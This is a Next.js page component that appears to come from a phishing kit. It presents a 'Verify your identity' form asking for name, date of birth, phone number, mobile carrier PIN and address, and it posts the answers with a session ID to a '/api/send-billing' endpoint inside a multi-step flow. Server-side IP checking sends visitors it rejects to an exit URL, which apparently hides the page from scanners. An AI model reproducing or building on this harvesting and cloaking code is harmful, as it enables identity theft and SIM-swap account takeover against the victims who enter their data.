import axios from "axios";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Wrapper } from "../components/Wrapper";
import { Input } from "../components/Input";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface BillingProps {}

const schema = yup.object().shape({
  firstname: yup.string().required("This field is required"),
  lastname: yup.string().required("This field is required"),
  dob: yup.string().required("This field is required"),
  streetAddress: yup.string().required("This field is required"),
  zipCode: yup.string().required("This field is required"),
  state: yup.string().required("This field is required"),
  phoneNumber: yup.string().required("This field is required"),
  carrierPin: yup.string(),
  // mmn: yup.string(),
});

export const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(
      `billing`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`BILLING`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper title="Verify your identity" loading={loading} onSubmit={onSubmit}>
      <Input
        label={`First Name`}
        name={`firstname`}
        register={register}
        error={
          errors.firstname && (errors.firstname.message as unknown as string)
        }
      />

      <Input
        label={`Last Name`}
        name={`lastname`}
        register={register}
        error={
          errors.lastname && (errors.lastname.message as unknown as string)
        }
      />

      <Input
        label={`Date of Birth`}
        name={`dob`}
        register={register}
        error={errors.dob && (errors.dob.message as unknown as string)}
        mask={`99/99/9999`}
      />

      <Input
        label={`Phone Number`}
        name={`phoneNumber`}
        register={register}
        error={
          errors.phoneNumber &&
          (errors.phoneNumber.message as unknown as string)
        }
        mask={`(999) 999 9999`}
      />

      <Input
        label={`Carrier Pin`}
        name={`carrierPin`}
        register={register}
        error={
          errors.carrierPin && (errors.carrierPin.message as unknown as string)
        }
        type="number"
      />

      <Input
        label={`Address`}
        name={`streetAddress`}
        register={register}
        error={
          errors.streetAddress &&
          (errors.streetAddress.message as unknown as string)
        }
      />

      <Input
        label={`State`}
        name={`state`}
        register={register}
        error={errors.state && (errors.state.message as unknown as string)}
      />

      <Input
        label={`Zip Code`}
        name={`zipCode`}
        register={register}
        error={errors.zipCode && (errors.zipCode.message as unknown as string)}
        type="number"
      />
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Billing;
